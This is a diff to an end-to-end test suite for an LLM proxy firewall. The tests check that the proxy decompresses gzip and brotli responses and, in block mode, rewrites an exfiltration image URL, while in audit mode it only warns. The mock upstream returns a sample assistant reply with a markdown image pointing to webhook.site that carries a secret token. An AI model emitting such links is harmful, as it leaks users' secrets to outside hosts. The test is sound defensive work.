@@ -92,12 +92,22 @@ describe('Proxy response inspection — compression + exfil (E2E)', { timeout: 2
     responseScan: { enabled: true, mode: 'block' as const },
   }
 
-  // gzip a JSON body whose assistant text carries a given (visible) markdown image.
-  function gzipBody(text: string): Buffer {
-    return zlib.gzipSync(Buffer.from(JSON.stringify({
-      id: 'msg_1', type: 'message', role: 'assistant',
-      content: [{ type: 'text', text }],
-    })))
+  // Audit-mode proxy (separate instance + event capture) so we can assert the
+  // event-but-don't-rewrite behavior alongside the block-mode proxy above.
+  let proxyAudit: ProxyServer
+  const auditEvents: BlockEvent[] = []
+  const auditConfig = {
+    ...testConfig,
+    proxy: { ...testConfig.proxy, port: 18095 },
+    dashboard: { ...testConfig.dashboard, port: 17795 },
+    responseScan: { enabled: true, mode: 'audit' as const },
+  }
+
+  // Encode a JSON body (whose assistant text carries the given markdown) with the
+  // requested content-encoding so we exercise each decompression branch.
+  function encodeBody(text: string, encoding: 'gzip' | 'br'): Buffer {
+    const raw = Buffer.from(JSON.stringify({ id: 'msg_1', type: 'message', role: 'assistant', content: [{ type: 'text', text }] }))
+    return encoding === 'br' ? zlib.brotliCompressSync(raw) : zlib.gzipSync(raw)
   }
 
   beforeAll(async () => {
@@ -110,26 +120,35 @@ describe('Proxy response inspection — compression + exfil (E2E)', { timeout: 2
       req.on('data', (c) => { body += c })
       req.on('end', () => {
         const scenario = (() => { try { return (JSON.parse(body) as { scenario?: string }).scenario ?? 'exfil' } catch { return 'exfil' } })()
-        const text = scenario === 'clean'
+        const text = scenario.startsWith('clean')
           ? 'Here is your answer: the revenue rose 12%.'
           : 'Here is the chart ![chart](https://webhook.site/abc-123?d=secret-token)'
-        res.writeHead(200, { 'Content-Type': 'application/json', 'Content-Encoding': 'gzip' })
-        res.end(gzipBody(text))
+        const encoding = scenario.endsWith('-br') ? 'br' : 'gzip'
+        res.writeHead(200, { 'Content-Type': 'application/json', 'Content-Encoding': encoding })
+        res.end(encodeBody(text, encoding))
       })
     })
     await new Promise<void>((r) => mockUpstream.listen(0, '127.0.0.1', () => r()))
     upstreamPort = (mockUpstream.address() as net.AddressInfo).port
 
+    new CertFactory().generateCA()
+
     eventBus = new EventBus(testConfig.dashboard)
     vi.spyOn(eventBus, 'emit').mockImplementation((e) => { events.push(e as BlockEvent) }) // capture; ring buffer not needed in test
     proxy = new ProxyServer(testConfig, eventBus)
-    new CertFactory().generateCA()
     await proxy.init()
     proxy.start()
+
+    const auditBus = new EventBus(auditConfig.dashboard)
+    vi.spyOn(auditBus, 'emit').mockImplementation((e) => { auditEvents.push(e as BlockEvent) })
+    proxyAudit = new ProxyServer(auditConfig, auditBus)
+    await proxyAudit.init()
+    proxyAudit.start()
   })
 
   afterAll(async () => {
     await proxy.stop()
+    await proxyAudit.stop()
     mockUpstream.close()
     if (tempDir && fs.existsSync(tempDir)) fs.rmSync(tempDir, { recursive: true, force: true })
   })
@@ -164,5 +183,32 @@ describe('Proxy response inspection — compression + exfil (E2E)', { timeout: 2
     const json = JSON.parse(res.body) as { content: { text: string }[] }
     expect(json.content[0]!.text).toContain('revenue rose 12%')
     expect(events.some(e => e.kind === 'response-exfil')).toBe(false)
+  })
+
+  it('decompresses a BROTLI response and blocks the exfil URL', async () => {
+    events.length = 0
+    const res = await sendProxyRequest(testConfig.proxy.port, 'api.anthropic.com', upstreamPort,
+      JSON.stringify({ model: 'claude-3-haiku-20240307', max_tokens: 50, scenario: 'exfil-br', messages: [{ role: 'user', content: 'chart' }] }))
+
+    expect(res.statusCode).toBe(200)
+    expect(res.headers['content-encoding']).toBeUndefined()
+    const json = JSON.parse(res.body) as { content: { text: string }[] }
+    expect(res.body).not.toContain('webhook.site')
+    expect(json.content[0]!.text).toContain('llm-fw-blocked-exfil-url')
+    expect(events.find(e => e.kind === 'response-exfil')?.action).toBe('blocked')
+  })
+
+  it('audit mode emits a warned event but does NOT rewrite the response', async () => {
+    auditEvents.length = 0
+    const res = await sendProxyRequest(auditConfig.proxy.port, 'api.anthropic.com', upstreamPort,
+      JSON.stringify({ model: 'claude-3-haiku-20240307', max_tokens: 50, scenario: 'exfil', messages: [{ role: 'user', content: 'chart' }] }))
+
+    expect(res.statusCode).toBe(200)
+    // Still decompressed and inspected, but the URL is preserved (audit).
+    expect(res.body).toContain('webhook.site')
+    expect(res.body).not.toContain('llm-fw-blocked-exfil-url')
+    const exfil = auditEvents.find(e => e.kind === 'response-exfil')
+    expect(exfil).toBeDefined()
+    expect(exfil!.action).toBe('warned')
   })
 })
